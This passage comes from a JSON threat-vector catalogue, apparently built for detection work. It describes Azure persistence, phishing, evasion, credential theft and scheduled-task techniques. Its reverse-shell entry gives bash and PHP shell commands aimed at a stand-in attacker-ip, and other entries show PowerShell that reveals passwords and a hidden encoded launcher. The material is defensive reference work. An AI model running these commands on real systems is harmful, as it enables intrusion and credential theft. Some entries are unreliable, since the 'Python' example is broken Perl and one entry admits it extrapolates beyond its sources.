                "description": "Persistence through automation runbooks in Azure is a robust and often-overlooked \ntechnique that allows attackers to maintain privileged access in cloud environments \nby leveraging Azure Automation Accounts and their associated runbooks.\n\n### Attack Flow and Techniques\n\n**1. Attack Lifecycle**  \n- The attacker compromises an Azure account or system and escalates privileges, \noften to Global Administrator.\n- After initial access is revoked or remediated, the attacker uses Automation Accounts \nto regain or maintain access to the Azure tenant.\n\n**2. Runbook Creation and Modification**  \n- Attackers create a new Automation Account with excessive privileges (such as \"User Administrator\" or \"Subscription Owner\") \nor leverage an existing one.\n- A malicious runbook (typically a PowerShell script) is uploaded or an existing runbook is modified. These scripts can:  - Create new Azure AD users or service principals with high privileges.  - Deploy payloads (e.g., Cobalt Strike beacons) on Azure VMs.  - Mimic legitimate processes through naming conventions (e.g., \"SplunkDev\" for Automation Account, \"AzureAutomationMonitor\" for runbook).\n\n**3. Webhook Integration**  \n- The malicious runbook is linked to a webhook, enabling remote execution via HTTP \nPOST requests without direct authentication.\n- This allows attackers to regain access on demand, even after their original accounts \nare removed.\n\n**4. Privilege Retention and Escalation**  \n- Automation Accounts are configured with password or certificate-based authentication, \nproviding multiple avenues for re-entry.\n- Attackers may assign or retain excessive permissions to ensure the malicious runbook \ncan escalate privileges or create new backdoor accounts.\n\n**5. Hybrid Runbook Workers**  \n- Attackers may use Hybrid Runbook Workers, which run outside Azure\u2019s sandbox and \nare not subject to the same execution time limits. This allows for more complex \nor long-running malicious tasks.\n\n**6. Backdooring Packages and Runtime Environments**  \n- Beyond runbooks, attackers can backdoor the packages and runtime environments \n(modules and Python packages) that support Automation Accounts. Malicious code can \nbe embedded in these components, providing even deeper persistence.\n"
            },
            "23f6a192-a25d-48b8-a235-7bb55e483682": {
                "name": "Persistence with Azure Automanage Machine Configuration",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "Azure Policy enables administrators to define, enforce and remediate\nconfiguration standards on Azure resources and even on non Azure assets\nusing Azure Arc. One key feature, that was released in 2021, is the\nguest configuration feature of Azure Policy. Azure Policy Guest \nConfiguration is now called Azure Automanage Machine Configuration. \n\nAdversaries may use this functionality to gain persistence in an Azure \nenvironment if they have gained the necessary permissions within the \nsubscription. And since Azure VMs are in many cases directly integrated \nin the on-Premises Active Directory it is possible to gain additional \naccess there.\n"
            },
            "f9a6f927-d08c-40c1-85af-01331c471def": {
                "name": "Phishing with Azure AD B2B Collaboration",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Phishing with Azure AD B2B Collaboration involves exploiting the service to send \nmalicious invitations that appear to come from Microsoft or other third-parties,\nmaking it difficult for the user to detect that it is not legitimate.\nHere are the key points:\n\n### Malicious Invitations \nAdversaries can create a free trial for Azure AD Premium and set up an Enterprise App \nwith single sign-on (SSO) through a user-defined URL, which can be the adversary \nown website. This app can then be assigned to new users, allowing the adversaries to \ninsert phishing recipients[1].\n\n### Email Elements\nThe invitation email typically includes a warning about phishing, but the email \nitself appears legitimate. It is sent from a Microsoft address and includes a link \nto a landing page that may redirect users to the adversary site. The email may \nalso include the inviter name and profile image for added credibility[3].\n\n### Authentication Flow \nWhen a user accepts the invitation, they are redirected to the adversary site, \nmay look like a legitimate Microsoft page. This can be achieved by creating an \noutdated OneDrive logo or using a well-known brand name in the Entra ID organization[1].\n\n### Technical Details \nThe phishing campaign can be set up using PowerShell commands to manage Azure AD \nand MSOnline modules. The adversaries can also use the Create invitation API to \ncustomize the invitation message and ensure it appears legitimate[2][4].\n"
            },
            "dcf021a5-2846-40b4-8189-2695a7a32b9a": {
                "name": "Possible Smart App Control Evasion Attempt",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Smart App Control is a cloud-powered security feature in Windows 11 designed to \nblock malicious, untrusted, and potentially unwanted applications from running. \nIt uses a combination of reputation checks and digital signatures to determine whether \nan application is safe to execute. If an app is not recognized or is considered \nrisky, SAC blocks its execution.\n\n## Main Evasion Techniques\n\n**1. Registry Manipulation**\nRegistry manipulation is a common method in broader Windows attack vectors for disabling \nor bypassing security features. Adversaries may attempt to:\n- **Disable or modify SAC-related registry keys** to weaken or turn off the feature.\n- **Tamper with security policy settings** stored in the registry to lower protection levels.  \n**2. Code-Signing and Certificate Abuse**\nOne of the most prevalent methods to bypass SAC is to sign malware with a legitimate \ncode-signing certificate. Attackers increasingly use Extended Validation (EV) certificates, \nwhich require identity verification, by impersonating legitimate businesses to obtain \nthem. This allows malware to appear trustworthy and slip past SAC\u2019s checks.\n\n**3. Reputation-Based Evasion**\n- **Reputation Hijacking:** Attackers repurpose trusted applications (like script interpreters) \nto load and execute malicious code without triggering alerts.\n- **Reputation Seeding:** Attackers use seemingly innocuous binaries to trigger \nmalicious behavior after a certain time or event.\n- **Reputation Tampering:** Attackers alter parts of legitimate binaries to inject \nshellcode without losing their good reputation.\n\n**4. LNK Stomping**\nAttackers exploit the way Windows handles shortcut (LNK) files. By crafting LNK \nfiles with non-standard target paths or structures, they can remove the \"mark-of-the-web\" \n(MotW) tag before security checks are performed, allowing malicious payloads to \nbypass SAC.\n\n**5. Social Engineering**\nAttackers trick users into overriding security warnings or disabling SAC by posing \nas legitimate sources or using persuasive tactics.\n\n**6. Living-Off-The-Land Binaries (LOLBins)**\nAttackers abuse signed Microsoft-supplied binaries (e.g., `mshta.exe`, \n`rundll32.exe`, `regsvr32.exe`) to proxy execution of malicious scripts \nand payloads, which Smart App Control might not block if the binary is \nconsidered trusted.\n"
            },
            "e3d7cb59-7aca-4c3d-b488-48c785930b6d": {
                "name": "PowerShell usage for credential manipulation",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "Threat actors are using different methods to manipulate user's credentials.\nOne example of credential manipulation is by using PowerShell commands or\nscripts. For example, PowerShell cmdlets or custom section of script can be\nused to gather credentials from Windows Credential Manager or other\ncredentials stores in the system.\n\nExample for access Windows Credential Manager credentials with PowerShell:\n\nInstall-Module CredentialManager -force\nNew-StoredCredential -Target $url -Username $ENV:Username -Pass <parameter>\nGet-StoredCredential -Target <target>\n\nOr threat actors can use ready PowerShell module for Credential Manager:\n\nPS> Save-Module -Name CredentialManager -Path\nPS> Install-Module -Name CredentialManager -RequiredVersion <the_version>\n\nExample for Get-Credential cmdlet. This is a PS command which prompts a\nuser for his username and password, and then stores those credentials in a\n$Cred variable. The stored credentials are then passed to the Get-WmiObject\ncmdlet as the -Credential parameter, allowing the script to connect to the\nspecified remote computer using those credentials.\n\nExample: \n\n$Cred = Get-Credential\nGet-WmiObject -Class Win32_OperatingSystem -ComputerName $Computer -Credential $Cred\n\nWith a Credential parameter threat actors can pass the $credential variable\nto other different commands.\n\nExample:\n\nPS> $credential.UserName\nroot\n\nGetNetworkCredential() method is used to obtain the user's passwords.\nA threat actor can append a \"Password\" property in the end of\nGetNetworkCredential() method to display the passwords in cleartext.\n\nExample:\n\nPS> $credential.GetNetworkCredential()\n\nUserName Domain\n-------- ------\nroot\n\nPS51> $credential.GetNetworkCredential().Password\n<password_in_clear_text>\n"
            },
            "bdc58fee-8da6-4fc9-8fbd-30f8fd156bc7": {
                "name": "Powershell with encoded payload passed to cmdline",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "When working with PowerShell, a threat actor can encode a command or script\nusing Base64 or other type of encoding and pass it as a parameter to the\ncommand line. This technique is useful for obfuscating sensitive\ninformation or executing complex commands. (ref [1])   \n\n\nThe malicious document contains a macro which, upon execution,\ncreates a batch script at C:\\Users\\public\\new[.]bat with the\nfollowing content:  \n\npowershell -exec bypass -noP -w hidden -nonI -enc\"{string}\" del %0;\n\nOther possible examples for encoding with PowerShell commands: \n\nEncoding a Command with Base64\n\n1. Create a command as a string. \n\n$command = 'dir \"C:\\Program Files\"'\n\n2. Convert the command to Base64:\n\n$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)\n$encodedCommand = [Convert]::ToBase64String($bytes)\n\nNow you can run the encoded command using powershell.exe:\n\npowershell.exe -encodedCommand $encodedCommand\n\nIt's also possible to encode domain names, for example: \n\nPowershell input:\n\n[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(\"'sample_domain.com'\"))\n\nThreat actors also use PowerShell scripts for faster encoding process and result.  \n\nAn example of Powershell script (ref [2])  \n\nparam(\n[Parameter()][Alias(\"un\")][string]$Username,\n[Parameter()][Alias(\"pw\")][string]$Password\n)\n\nWrite-Host \"Username: $Username\"\nWrite-Host \"Password: $Password\"\n"
            },
            "e8761933-3137-41f7-bf7a-2687cac68524": {
                "name": "ProcDump cookie exfiltration",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Cookies can be found on disk and also in process memory. Additionally other \napplications on the targets machine might store sensitive authentication\ntokens in memory (e.g. apps which authenticate to cloud services). \n\nProcDump is a Sysinternal tool to dump strings from any process.\n\nUsing the example of the Firefox browser, an attacker can steal the browser \ncookies via ProcDump following the steps below:\n  - Acquire the cookie from the user browser via process dump.  - Exfiltrate the necessary authentication cookies.  - Open Firefox on the attackers machine.  - Navigate to the resource to access (the domain the cookie is valid for).  - Use the Developer Console and set the cookie via document.cookie=\u201ckey=value\u201d.\n"
            },
            "cc7dd57f-8d9e-451f-8ec7-4bb2ad10e96c": {
                "name": "Process discovery",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "A process discovery refers to the process of identifying and analyzing\nthe running processes on a system or network. This involves gathering\ninformation about the processes, such as their names, IDs, command\nlines, and other relevant details ref [1].  \n\nFor example, in Windows environment, an adversary could obtain details\non running processes using the Tasklist utility via cmd or `Get-Process`\nvia PowerShell. Information about processes can also be extracted from\nthe output of Native API calls such as `CreateToolhelp32Snapshot`\nref [2].  \n\nIn Mac and Linux, this is accomplished with the ps command.\nThe threat actors may also opt to enumerate processes via /proc.\n\nBy analyzing the running processes on a system or network, the threat\nactors can abuse process discovery functionality in some of the\nfollowing ways:  \n\n### Living-off-the-Land (LOTL) techniques to identify potential targets \n\nThe threat actors may abuse native tools (PowerShell, WMIC) to blend\nin with normal activity, avoiding suspicion.    \n\n### Used tools by threat actors for process discovery on a target system\n\n#### 1. Tasklist (Windows built-in) \n\nThis command-line tool is used to display a list of currently running\nprocesses on a Windows system. Threat actors might use it to identify\npotential targets for exploitation or to understand the system's\nconfiguration.  \n\n#### 2. Process Monitor (SysInternals)\n\nProcess Monitor can be used to verify if the browser or other service\nis launched on a target system and with what level of privileges. This\ntool can monitor what processes are running on the system.      \n\n#### 3. PsExec (SysInternals) \n\nThis tool allows users to execute processes remotely, but it can also\nbe used to list running processes on a target system. Threat actors\nmight use PsExec to gather information about the system's processes\nwithout being detected.\n\n#### 4. PowerShell (Windows built-in)\n\nPowerShell is a powerful scripting language that can be used to\nautomate tasks, including process discovery. Threat actors might use\nPowerShell cmdlets like Get-Process to list running processes on a\ntarget system.  \n\n#### 5. Windows Management Instrumentation functionality (Windows built-in)\n\nThreat actors can abuse WMI (Windows Management Instrumentation) filters\nin Windows for process discovery. Examples include running WMI queries\n(e.g., WMIC) to retrieve information about running processes, Creating\nWMI specific event filters to monitor process creation, modification\nand other process related information. Threat actors also can utilize\nWMI filters to execute queries that retrieve process information,\nfor example: such as `SELECT * FROM Win32_Process`.  \n\n#### 6. ProcDump (SysInternals)\n\nThis tool is designed to capture and analyze process dumps, but it can\nalso be used to list running processes on a target system. Threat actors\nmight use ProcDump to gather information about the system's processes and\nidentify potential vulnerabilities.  \n\n#### 7. Process Explorer (SysInternals)\n\nThis tool provides a detailed view of running processes, including their\nmemory usage, network connections, and system resources. Threat actors\nmight use Process Explorer to gather information about the system's\nprocesses and identify potential targets for exploitation.  \n\n#### 8. Cygwin or Linux tools (e.g., ps, top, htop)\n\nIf the target system has a Unix-like environment installed, threat actors\nmight use tools like ps, top, or htop to list running processes and gather\ninformation about the system's configuration.  \n\n#### 9. Meterpreter (Metasploit)\n\nMeterpreter is a payload that can be used to exploit vulnerabilities and\ngain access to a target system. It includes a range of tools, including\nprocess discovery capabilities, that threat actors can use to gather\ninformation about the system's processes.\n\n#### 10. Cobalt Strike's Process List\n\nCobalt Strike is a commercial penetration testing tool that includes\na range of features, including process discovery. Threat actors might\nuse Cobalt Strike to list running processes on a target system and\nidentify potential targets for exploitation.\n"
            },
            "bc5aed0c-a2d1-4406-9a47-0721f3753a3b": {
                "name": "Protocol based DDoS attack",
                "model": true,
                "tlp": "clear",
                "criticality": "Emergency",
                "description": "Threat actors may wish to cause business disruption, media/public attention, or to use the pretense of business disruption to disguise other activities. Any DDoS attack should always be followed up with other DFIR activities to determine if the attack was meant to distract from something else. DDoS can distract by pulling attention away, or even by spooling out log files so that relevant entries are overwritten."
            },
            "37381f28-ad9f-40c3-80f8-d8a82d6ce9a3": {
                "name": "Resource Secret Reveal in Azure",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "The following threat vector involves adversaries accessing sensitive secrets, keys, \nor credentials stored or used by Azure resources such as KeyVaults, Storage Accounts, \nAutomation Accounts, or within deployment histories.\n\n### Example Attack Scenario\n\nAn attacker with sufficient privileged access in Azure exploits misconfigured permissions, \nallowing them to access a Storage Account and execute the `listkeys` action. This \nreveals access keys that grant full control over the account's data. Alternatively, \nby editing or viewing Azure Automation Account runbooks or Resource Group deployment \nhistory, the attacker discovers embedded credentials or secrets used in automation \nprocesses, which may then be used to escalate privileges or move laterally within \nthe environment.\n\n### Attack Goals and Impact\n\n- **Primary goal:** Exfiltrate sensitive secrets, such as Storage Account access \nkeys, service principal credentials, KeyVault secrets, or any plaintext credentials \nexposed in ARM templates or automation runbooks.\n- **Impact:** Once these secrets are exposed, attackers can impersonate service \nidentities, gain unauthorized access to data, break the integrity and confidentiality \nof cloud services, or launch further attacks including data exfiltration, lateral \nmovement, persistence, or privilege escalation.\n\n### Attack Flow and Methodology\n\n- **Reconnaissance:** Identifies potential resources containing secrets, such as \nStorage Accounts, Automation Accounts, or deployment resource groups.\n- **Execution:**     - For Storage Accounts: Executes `Microsoft.Storage/storageAccounts/listkeys/action`     to dump access keys.    - For Automation Accounts: Edits or reviews runbooks to extract embedded credentials.    - For Resource Groups: Reads deployment history to extract secrets/credentials     embedded in ARM templates.\n- **Objective:** Uses the exfiltrated secrets to access additional resources, escalate \nprivileges, or maintain persistence in the Azure environment.\n"
            },
            "b5e8300c-6887-48c2-a18d-e3d910478fe8": {
                "name": "Retrieve browser cookie with Python",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Cookies contain information stored in a user browser, such as session state and\nuser preferences. There are multiple ways to retrieve browser cookies using Python.\n\nHere are several commonly used methods in Python to obtain browser cookies\nalong with example code:\n\n1. Use the Selenium library to retrieve browser cookies.\n  from selenium import webdriver\n  Initialize the browser driver  driver = webdriver.Chrome()\n  Open the webpage  driver.get(\"http://www.example.com\")\n  Retrieve browser cookies  cookies = driver.get_cookies()\n  Print the cookies  for cookie in cookies:      print(cookie)\n  Close the browser  driver.quit()  \n2. Using the browser developer tools to retrieve browser cookies\n  import requests\n  send HTTP requests  response = requests.get(\"http://www.example.com\")\n  get response about Cookies  cookies = response.cookies\n  print out Cookies  for cookie in cookies:      print(cookie.name, cookie.value)         \n3. Saving cookies from the browser developer tools as a HAR (HTTP Archive) file\n  In the Network panel of the browser developer tools, select a request, right-click,  and choose \u201cSave All as HAR with Content\u201d to save the request and response as a  HAR file. Then, use Python to parse the HAR file and extract the cookie information.\n  The following is an example code demonstrating how to parse browser cookies using a HAR file:\n  import json\n  read HAR file  with open(\"example.har\", \"r\") as file:      har_data = json.load(file)\n  extract Cookies information  cookies = har_data[\"log\"][\"entries\"][0][\"response\"][\"cookies\"]\n  print out Cookies  for cookie in cookies:      print(cookie[\"name\"], cookie[\"value\"])        \n4. Use the browsercookie Python module that loads cookies used by the web browser into a   cookiejar object. This can be useful to download the same content seen in the   web browser without needing to login.      import urllib.request  public\\_html = urllib.request.urlopen(url).read()  opener = urllib.request.build\\_opener(urllib.request.HTTPCookieProcessor(cj))  "
            },
            "157710ff-962d-4fa3-a516-ac5883f2d5ef": {
                "name": "Reverse shell or remote session from compromised host",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "### Threat vector\nA reverse shell is a technique that refers to a situation\nwhere adversaries, who have successfully compromised a system,\nestablish a connection to their own system or server.\nThis connection allows the adversaries to gain remote access \nand control over the compromised system, enabling them to \nexecute commands and perform malicious actions.  \n\n### Command&Control phases\nBelow are the phases of how a reverse shell works:  \n\n- System compromise: the adversaries must succeed in compromising  the security of the system. This may involve exploiting vulnerabilities  in the software, misconfiguration, tricking the user into running a   malicious program, or via other ways.  \n\n- Establishing a reverse connection: Once the system has been compromised,  the adversaries set up a reverse connection from the compromised system  to their own. This is often done using a malicious application or script  that runs on the compromised system and communicates with a server controlled   by adversaries.  \n\n- Remote control: With the reverse connection established, adversaries can  have full or partial access and control over the compromised system. This   allows them to execute commands, manipulate files, steal information, install  additional malware, modify configurations and perform other actions according   to their goals.  \n\n### Code examples of reverse shells:\n\n#### Example 1 - Bash        Start a listener on the attackers machine  `nc -nlvp 4444`\n  On the target machine, use Bash to establish a connection back to the listener  `bash -i >& /dev/tcp/attacker-ip/4444 0>&1`\n  This code assumes that the attacker has started a listener on their machine using  the nc (netcat) utility, which is listening on a specified port (in this case, 4444).   The second line of code, which is executed on the target machine, uses Bash to open  a connection back to the listener and establish a command shell. \n\n#### Example 2 - PHP\n  The attacker establishes a command shell on a remote machine by exploiting a  vulnerability in the target system and using PHP, a server-side scripting language,  to execute commands on the target machine:\n\n```  <?php  // Start a listener on the attacker's machine  $sock=fsockopen(\"attacker-ip\", 4444);  exec(\"/bin/sh -i <&3 >&3 2>&3\");  ?>\n```\n\nThe PHP code uses the fsockopen() function to open a connection to the listener and\nthe exec() function to execute the /bin/sh shell and redirect its input, output, and\nerror streams to the connection with the listener.\n\n#### Example 3 - Python\n\nThis code example can be used to establish a command shell on a remote machine.\n\nStart a listener on the attackers machine\n```  use IO::Socket;  $|=1;  $socket = new IO::Socket::INET (      LocalHost => '0.0.0.0',      LocalPort => '4444',      Proto => 'tcp',      Listen => 1,      Reuse => 1  );\n  Wait for a connection from the target machine  $new_socket = $socket->accept();\n  Open a command shell on the target machine  system(\"/bin/sh -i <&3 >&3 2>&3\");\n  Close the connection  $new_socket->close();\n```\n"
            },
            "bdb9fd43-a9f9-4026-84a5-0b52d3b0243b": {
                "name": "Rogue access point",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "A rogue access point (AP) is any wireless access point connected to a network without \nexplicit authorization from network administrators. These unauthorized devices \ncan be set up deliberately by attackers or unintentionally by employees, and they \nbypass the security controls and configurations established by IT teams, exposing \nthe network to significant risks.\n\n### How Rogue Access Points Work\n\n- **Impersonation:** Rogue APs may mimic legitimate networks by copying the Service \nSet Identifier (SSID), tricking users into connecting to them.\n- **Open Access:** Many operate without passwords or encryption, making them easy \nfor devices to discover and connect to, but extremely vulnerable.\n- **Traffic Interception:** Once connected, attackers can intercept all data transmitted, \nincluding credentials and confidential information, using packet sniffing tools.\n- **Attack Platform:** They serve as a launchpad for further attacks such as man-in-the-middle (MitM), \nmalware distribution, phishing, and ransomware deployment.\n\n### Risks and Threats\n\n- **Data Interception & Theft:** Sensitive information, such as login credentials, \nfinancial data, and confidential documents, can be captured.\n- **Man-in-the-Middle Attacks:** Attackers can intercept, modify, or inject data \ninto communications, hijack sessions, and steal credentials.\n- **Malware Distribution:** Rogue APs can be used to distribute malware or ransomware \nto connected devices.\n- **Credential Theft:** Users may unknowingly submit credentials to attackers.\n- **Network Disruption:** Rogue APs can interfere with legitimate network operations, \ncausing downtime and instability.\n- **Regulatory Compliance Violations:** Industries with strict data regulations \n(e.g., healthcare, finance) risk non-compliance and potential fines if rogue APs are present.\n"
            },
            "d11bfb38-3a0c-4e38-a973-efa2da1e8a73": {
                "name": "Scheduled task created on remote endpoint",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "Adversaries with access to the right credentials can create scheduled tasks \nremotely from an endpoint they control for malicious purposes, which often \ninclude outbound connections to attacker infrastructure, binary execution, \nachieve persistance or registry entry editing or creation, but in this case\nthe remote scheduled task achieves lateral movement. \n\nAdversaries can create and configure scheduled tasks on remote endpoints \nusing either the task scheduler or PowerShell.\n\nOne example syntax used to create a new task on a remote computer is to \nuse \\computername\n\nExamples: \n\nat \\\\computername time/interactive | /every: date, ... /next: date, ... command\nat \\\\computername id/delete | /delete /yes\n\nRun a scheduled task on a remote mashine using PowerShell, example:\n\nschtasks /run /s ComputerName /tn \u201cdescription\u201d\n\nUsing the task Scheduler, as example: > \"Connect to Another Computer\", \nprovide the IP address of the remote system and select \"Connect as another \nuser\" > \"Set User\".\n"
            },
            "670504aa-cfb8-4d1f-a5ad-16193822085f": {
                "name": "Scheduled task creation using Azure CloudShell",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "Threat actors can use Azure CloudShell, which is accessible via the Azure\nportal or the browser, to create scheduled tasks.\n\nThe path to the Action parameter of the scheduled task is set in the task.\nThreat actors can also use the Azure CloudShell editor to edit and\nvisualize in a better format their code before deploying it.\n\nFor example, threat actors use \"New-ScheduledTaskTrigger\" cmdlet to create\na trigger for the new scheduled task and further \"New-ScheduledTaskAction\"\ncmdlet to create a specific action for the task. In the end the \n\"Register-ScheduledTask\" cmdlet is used to create the scheduled task. \n\n$Trigger = New-ScheduledTaskTrigger -Daily -At <time: hh:mm>\n$Action = New-ScheduledTaskAction -Execute \"PowerShell.exe\" -Argument \"-File C:\\Scripts\\My_task_script.ps1\"\nRegister-ScheduledTask -TaskName \"My Task\" -Trigger $Trigger -Action $Action -RunLevel Highest\n"
            },
            "edfe43fd-4a92-4f2d-a733-40e235be1b25": {
                "name": "Scheduled task manipulation using Azure CLI",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Scheduled task manipulation using Azure CLI is a sophisticated threat vector that \nallows adversaries to establish persistence and execute malicious code in cloud environments. \nWhile the search results do not specifically mention Azure CLI, we can extrapolate \nthe threat based on the general concept of scheduled task abuse.    \n\n## Key aspects of the threat:    \n\n1. **Persistence mechanism**: Adversaries can create or modify scheduled tasks to \nrun malicious code at specified times or system startup, ensuring long-term access \nto compromised systems.    \n\n2. **Privilege escalation**: Tasks can be configured to run with elevated privileges, \noften as SYSTEM, granting attackers the highest level of access on Windows systems.    \n\n3. **Stealth**: Attackers may create \"hidden\" scheduled tasks by manipulating registry \nvalues, making them invisible to standard enumeration tools.    \n\n4. **Versatility**: Scheduled tasks can be used for various malicious purposes, \nincluding initial access, lateral movement, and executing additional payloads.    \n\n## Specific techniques:    \n\n1. **Command execution**: Adversaries often use scheduled tasks to open command \nshells or execute arbitrary binaries from user-writable directories.    \n\n2. **Network connections**: Tasks may be configured to reach out to external domains \nand download malicious payloads on a recurring schedule.    \n\n3. **Abuse of legitimate tools**: Attackers can leverage native Windows utilities \nlike schtasks.exe or PowerShell cmdlets to create and manage malicious tasks.    \n\n4. **Registry manipulation**: Advanced adversaries may directly modify registry \nkeys related to scheduled tasks to evade detection.    \n\n5. **Masquerading**: Malicious tasks can be disguised as legitimate system processes \nor software updates to avoid suspicion.\n"
            },
            "437a43b9-6344-45a9-915b-d733d23173ae": {
                "name": "Scheduled task manipulation using Azure Portal",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Scheduled tasks in Azure, often called \"WebJobs\" or \"Azure Functions\" with timer \ntriggers, are automated processes set to run at specific times or intervals. They \nare used for maintenance, backups, data processing, and other routine operations.\n\nThis scheduled tasks can be manipulated by threat actors to execute malicious \ncode, steal sensitive information, or disrupt business operations. The manipulation \nof scheduled tasks can be achieved through various means, including:\n\n### Azure metadata service exploitation\n\nAdversaries can abuse the Azure Instance Metadata Service (IMDS) to gather sensitive \ninformation about virtual machines.  \nThe IMDSv1 endpoint is particularly vulnerable to Server-Side Request Forgery \n(SSRF) attacks due to its accessibility via GET requests.\n\n### Scheduled events manipulation\n\nAttackers can exploit Azure scheduled events, a feature of the Azure Metadata \nService, to prepare for and execute attacks during VM maintenance windows.  \nThis technique allows malicious actors to anticipate system changes and potentially \nexploit vulnerabilities during maintenance periods.\n\n### Custom script extensions\n\nThreat actors can abuse Custom script extensions, which are designed to automate \npost-deployment scripts on VMs.  \nThis feature can be misused to execute malicious code, install unauthorized software, \nor reconfigure systems for nefarious purposes.      \n\n### Leveraging exploited vulnerabilities\n\nAttackers can use exploited vulnerabilities in Azure services, such as Azure Automation \nor Logic Apps, to create more complex, distributed scheduled actions that are harder to detect.\n\n### Utilizing obfuscated code\n\nAttackers might use obfuscated code within tasks to evade detection and make it \nharder for security teams to identify and mitigate the threat.\n\n### Deleting logs and hiding tracks\n\nAttackers might delete logs related to task creation or modification, and modify \ntask descriptions to seem innocuous, in an attempt to hide their tracks and make \nit harder to investigate and remediate the attack.\n"
            },
            "2b560980-d4c6-428c-963f-697e7e29938c": {
                "name": "Scheduled tasks created with command line",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "Adversaries can use  Windows Command Shell (cmd.exe) to execute specific commands \nto create scheduled tasks for the purposes of dwelling, execution of binaries, \nor for communication to Command and Control server infrastructure.\n\n\nExamples for creation of a scheduled task via command-line interface:\n\n1. Create a daily task to run at specific time:\n   SCHTASKS /CREATE /SC DAILY /TN \"FOLDERPATH\\TASKNAME\" /TR \"C:\\SOURCE\\FOLDER\\APP-OR-SCRIPT\" /ST HH:MM\n\nThe folder path before the task name, under the /TN option, is not a requirement, \nbut it'll help to keep the tasks separated. If the path is not specified, the task \nwill be created inside the Task Scheduler Library folder.\n\n2. Create a weekly task to run at specific time:\n  SCHTASKS /CREATE /SC WEEKLY /D SUN /TN \"FOLDERPATH\\TASKNAME\" /TR \"C:\\SOURCE\\FOLDER\\APP-OR-SCRIPT\" /ST HH:MM\n\n3. Create monthly task to run at specific time:\n  SCHTASKS /CREATE /SC MONTHLY /D 15 /TN \"FOLDERPATH\\TASKNAME\" /TR \"C:\\SOURCE\\FOLDER\\APP-OR-SCRIPT\" /ST HH:MM\n\n4. Create a scheduled task that runs daily as a specific user:\n  SCHTASKS /CREATE /SC DAILY /TN \"FOLDERPATH\\TASKNAME\" /TR \"C:\\SOURCE\\FOLDER\\APP-OR-SCRIPT\" /ST HH:MM\n\nParameters that can be used in creation scheduled task command:\n /CREATE - specifies the creation a new automated routine task /SC - define the schedule of the task, for example it can include MINUTE, HOURLY, DAILY, WEEKLY, MONTHLY, ONCE, ONSTART, ONLOGON, ONIDLE, and ONEVENT. /D \u2014 specifies the day of the week to execute the task. (examples MON, TUE and etc) /TN \u2014 specifies the task name and location, the task can be created in a specific location directory (example /TN \"FOLDERPATH\\TASKNAME\") /ST \u2014 defines the time to run the task (in 24 hours format) /RU \u2014 specifies the task to run under a specific user account. /QUERY \u2014 displays all the system tasks.\n"
            },
            "a5f631c3-6fb0-484f-89e4-c8b2e038db8f": {
                "name": "Scheduled tasks created with PowerShell",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "A threat actor can use PowerShell to create tasks for nefarious purposes. \n\nScripts requires admin rights to create a new scheduled task. The script \nwill run in the context of the user who created the scheduled task.\n\nScheduled tasks are typically used to either connect to adversary \ninfrastructure, establish persistence or to execute binaries.\n"
            },
            "24503678-9a1b-4af3-9837-a90bf47b7dda": {
                "name": "Scheduled tasks created with taskschlr.exe",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "A threat actor can use the Task Scheduler to create tasks for nefarious purposes. For example, during \nthe creation of a task in Task Scheduler > Create Task, the newly created task can be configured with \nspecific options in the tab \"Action\". Through the \"Action\" settings the threat actor can specify \nthe actions for the task to execute, which often include outbound connections to attacker \ninfrastructure, binary execution or registry entry editing or creation.\n\nExample: \n\nAction: \"Start a program\"\nIn Program/script field: C:\\ProgramData\\<name.exe>\n\nTasks are stored in C:\\Windows\\System32\\Tasks\\ in XML format.\n\nThey reside in the following registry:\n\nHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{GUID}\n\n\u201cActions\u201d value stored within the Tasks\\{GUID} key points to the command line associated with the task.\nIn the registry under HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{GUID}\nthere is a registry key for the task with a key \"Actions\" related to Tasks\\{GUID} id. In \"Edit Binary Value\"\nof the registy key \"Action\" there is a reference to the path which can contain malicious executable file,\nfor example: C:\\Windows\\System32\\taskschlr.exe or other.\n\nSimilar information is stored within an extensionless XML file, created within C:\\Windows\\System32\\Tasks, \nwhere the name of the file matches the name of the task. \n\nExample for Settings section in XML file with potentially malicious executable file: \n\n<Task version=\"the_version\" xmlns=\"http_link\"> ... </Settings> <Actions Context=\"Author\">   <Exec>    <Command>C\\Windows\\System32\\taskschlr.exe</Command>   </Exec> <Actions>\n</Task>\n"
            },
            "08b47a3b-fe90-4c9e-97f0-aa7bae361db1": {
                "name": "Scheduled tasks to connect to adversarial infrastructure",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "A scheduled task is a task that is set to run automatically at a specific\ntime or interval. \n\nIn the context of connecting to adversarial infrastructure,\na scheduled task would be a task that is set up to automatically establish\na connection to C2 infrastructure to check for 'orders' at a specified time\nor interval. \n\nThis could involve running a script that usually establishes an outbound \nconnection. The exact details of how the task is set up would depend on the \nspecific adversarial infrastructure being used and the tools and protocols \navailable for connecting to it.\n"
            },
            "707bf160-5d78-42cc-85d3-e4831f62357c": {
                "name": "Scheduled tasks to execute binaries",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
